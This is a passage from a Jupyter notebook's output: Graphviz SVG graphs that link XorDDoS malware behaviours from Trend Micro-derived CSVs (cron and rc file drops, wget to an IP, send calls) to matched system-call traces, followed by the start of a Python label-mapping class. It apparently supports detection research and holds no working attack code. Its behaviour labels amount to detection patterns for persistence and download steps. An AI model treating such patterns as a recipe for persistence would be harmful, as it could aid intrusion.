1169.48,-42.96\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1172.07,-45.31 1176.36,-35.62 1166.97,-40.53 1172.07,-45.31\"/>\n<text text-anchor=\"middle\" x=\"1179.64\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">13.open</text>\n</g>\n<!-- 8 -->\n<g id=\"node9\" class=\"node\">\n<title>8</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1309.64\" cy=\"-18\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1309.64\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge15\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M722.48,-102.88C854.18,-100.35 1117.46,-92.45 1206.64,-69 1231.21,-62.54 1256.91,-50.08 1276.49,-39.21\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1278.34,-42.18 1285.31,-34.19 1274.88,-36.09 1278.34,-42.18\"/>\n<text text-anchor=\"middle\" x=\"1268.64\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">27.clone</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x20853820280>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"473pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 473.49 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 469.49,-127 469.49,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"142\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"142\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"27\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"27\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M110.25,-88.44C99.93,-82.85 88.66,-76.14 79,-69 67.98,-60.86 56.89,-50.55 47.79,-41.41\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"50.15,-38.81 40.67,-34.08 45.13,-43.69 50.15,-38.81\"/>\n<text text-anchor=\"middle\" x=\"96.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.read</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"99\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"99\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M133.3,-86.8C127.12,-74.58 118.72,-57.98 111.78,-44.26\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"114.89,-42.65 107.25,-35.31 108.64,-45.81 114.89,-42.65\"/>\n<text text-anchor=\"middle\" x=\"141.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.read</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"185\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"185\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M152.69,-87.15C156.14,-81.47 159.87,-75.04 163,-69 166.92,-61.42 170.81,-52.99 174.19,-45.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"177.47,-46.48 178.18,-35.91 171.03,-43.73 177.47,-46.48\"/>\n<text text-anchor=\"middle\" x=\"188.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.read</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"287\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"287\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M173.84,-88.45C185.37,-82.6 198.4,-75.73 210,-69 225.87,-59.79 243.04,-48.76 257.12,-39.4\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"259.1,-42.29 265.46,-33.82 255.2,-36.47 259.1,-42.29\"/>\n<text text-anchor=\"middle\" x=\"252\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.drop</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"271\" cy=\"-105\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"271\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"394\" cy=\"-105\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"394\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x208538202b0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"338pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 337.90 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 333.9,-127 333.9,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"142\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"142\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"27\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"27\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M110.25,-88.44C99.93,-82.85 88.66,-76.14 79,-69 67.98,-60.86 56.89,-50.55 47.79,-41.41\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"50.15,-38.81 40.67,-34.08 45.13,-43.69 50.15,-38.81\"/>\n<text text-anchor=\"middle\" x=\"96.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.read</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"99\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"99\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M133.3,-86.8C127.12,-74.58 118.72,-57.98 111.78,-44.26\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"114.89,-42.65 107.25,-35.31 108.64,-45.81 114.89,-42.65\"/>\n<text text-anchor=\"middle\" x=\"141.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.read</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"185\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"185\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M152.69,-87.15C156.14,-81.47 159.87,-75.04 163,-69 166.92,-61.42 170.81,-52.99 174.19,-45.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"177.47,-46.48 178.18,-35.91 171.03,-43.73 177.47,-46.48\"/>\n<text text-anchor=\"middle\" x=\"188.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.read</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"287\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"287\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M173.84,-88.45C185.37,-82.6 198.4,-75.73 210,-69 225.87,-59.79 243.04,-48.76 257.12,-39.4\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"259.1,-42.29 265.46,-33.82 255.2,-36.47 259.1,-42.29\"/>\n<text text-anchor=\"middle\" x=\"252\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.drop</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x20853820280>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Trendmicro.csv\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"618pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 617.95 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 613.95,-127 613.95,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"328.95\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"328.95\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"40.95\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"40.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M253.56,-100.6C167.39,-95.93 36.2,-86.09 20.95,-69 14.5,-61.78 16.54,-52.23 21.25,-43.41\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"24.22,-45.26 26.64,-34.94 18.32,-41.5 24.22,-45.26\"/>\n<text text-anchor=\"middle\" x=\"43.95\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">57.lseek</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M254.54,-99.74C212.39,-95.4 159.38,-86.65 114.95,-69 97.64,-62.13 80.29,-50.7 66.74,-40.5\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"68.88,-37.73 58.83,-34.37 64.59,-43.26 68.88,-37.73\"/>\n<text text-anchor=\"middle\" x=\"140.45\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.stat64</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"162.95\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"162.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M263.78,-95.27C229.32,-89.42 191.57,-80.65 178.95,-69 172.47,-63.02 168.6,-54.43 166.3,-46.05\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"169.69,-45.17 164.19,-36.12 162.84,-46.63 169.69,-45.17\"/>\n<text text-anchor=\"middle\" x=\"201.95\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.open</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"358.95\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"358.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M269.71,-93.27C242.2,-85.55 218.45,-73.07 232.95,-54 243.76,-39.77 288.94,-29.8 322.12,-24.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"323.09,-27.63 332.41,-22.59 321.98,-20.72 323.09,-27.63\"/>\n<text text-anchor=\"middle\" x=\"269.95\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">70.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M326.54,-86.81C325.82,-76.92 326.07,-64.42 329.95,-54 331.64,-49.43 334.21,-45.03 337.13,-40.98\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"339.84,-43.19 343.44,-33.23 334.41,-38.77 339.84,-43.19\"/>\n<text text-anchor=\"middle\" x=\"348.45\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.stat</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M352.86,-87.54C358.54,-82.33 363.85,-76.06 366.95,-69 370.14,-61.72 370.08,-53.35 368.66,-45.56\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"372.04,-44.64 366.19,-35.81 365.26,-46.36 372.04,-44.64\"/>\n<text text-anchor=\"middle\" x=\"392.95\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">56.lseek</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M387.5,-93.14C400.22,-87.96 412.18,-80.3 419.95,-69 430.72,-53.31 411.82,-39.92 392.28,-30.96\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"393.64,-27.73 383.07,-27.04 390.9,-34.17 393.64,-27.73\"/>\n<text text-anchor=\"middle\" x=\"449.45\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.stat64</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"565.95\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"565.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M390.39,-93.88C418.03,-88.27 450.71,-80.13 478.95,-69 500.14,-60.65 522.39,-47.78 539.08,-37.19\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"541.24,-39.96 547.74,-31.58 537.44,-34.08 541.24,-39.96\"/>\n<text text-anchor=\"middle\" x=\"531.95\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">58.lseek</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M405.4,-101.95C463.85,-98.69 537.87,-90.33 558.95,-69 564.84,-63.04 567.3,-54.55 568.08,-46.26\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"571.59,-46.14 568.3,-36.07 564.59,-45.99 571.59,-46.14\"/>\n<text text-anchor=\"middle\" x=\"587.95\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">3.stat64</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x208538202b0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro2.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M59.61,-87.36C55.05,-81.99 50.75,-75.68 48.34,-69 45.06,-59.89 48.37,-50.55 53.77,-42.44\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"56.58,-44.53 59.97,-34.5 51.06,-40.23 56.58,-44.53\"/>\n<text text-anchor=\"middle\" x=\"66.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.wget</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M82.11,-86.69C83.43,-81.09 84.69,-74.82 85.34,-69 86.19,-61.52 85.57,-53.45 84.38,-46.02\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"87.78,-45.2 82.4,-36.07 80.92,-46.56 87.78,-45.2\"/>\n<text text-anchor=\"middle\" x=\"101.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.find</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x20853820280>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro2.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M59.61,-87.36C55.05,-81.99 50.75,-75.68 48.34,-69 45.06,-59.89 48.37,-50.55 53.77,-42.44\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"56.58,-44.53 59.97,-34.5 51.06,-40.23 56.58,-44.53\"/>\n<text text-anchor=\"middle\" x=\"66.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.wget</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M82.11,-86.69C83.43,-81.09 84.69,-74.82 85.34,-69 86.19,-61.52 85.57,-53.45 84.38,-46.02\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"87.78,-45.2 82.4,-36.07 80.92,-46.56 87.78,-45.2\"/>\n<text text-anchor=\"middle\" x=\"101.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.find</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x208538202b0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Trendmicro2.csv\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"176pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 176.34 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 172.34,-127 172.34,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M57.48,-87.29C52.57,-82 47.97,-75.75 45.34,-69 41.65,-59.49 45.6,-49.86 51.83,-41.62\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"54.65,-43.72 58.63,-33.9 49.39,-39.09 54.65,-43.72\"/>\n<text text-anchor=\"middle\" x=\"67.34\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">62.send</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M84.91,-87C88.31,-77.38 91.19,-65.1 89.34,-54 88.88,-51.24 88.23,-48.41 87.47,-45.61\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"90.72,-44.27 84.36,-35.8 84.05,-46.39 90.72,-44.27\"/>\n<text text-anchor=\"middle\" x=\"128.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">64._newselect</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x20853820280>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import graphviz\n",
    "\n",
    "class ItemMapper:\n",
    "    def __init__(self) -> None:\n",
    "        self.mapper = {}\n",
    "        self.index_counter:int = 1\n",
    "        # self.pretty_name = {\n",
    "        #     \"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\": \"ip_addr\",\n",
    "        #     \"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+\": \"ip_addr+port\",\n",
    "        #     \"0x[0-9a-zA-Z]{8}\": \"mem_addr\",\n",
    "        #     \"permission:{0,1}[0-9]{0,4}\": \"permission_id\"\n",
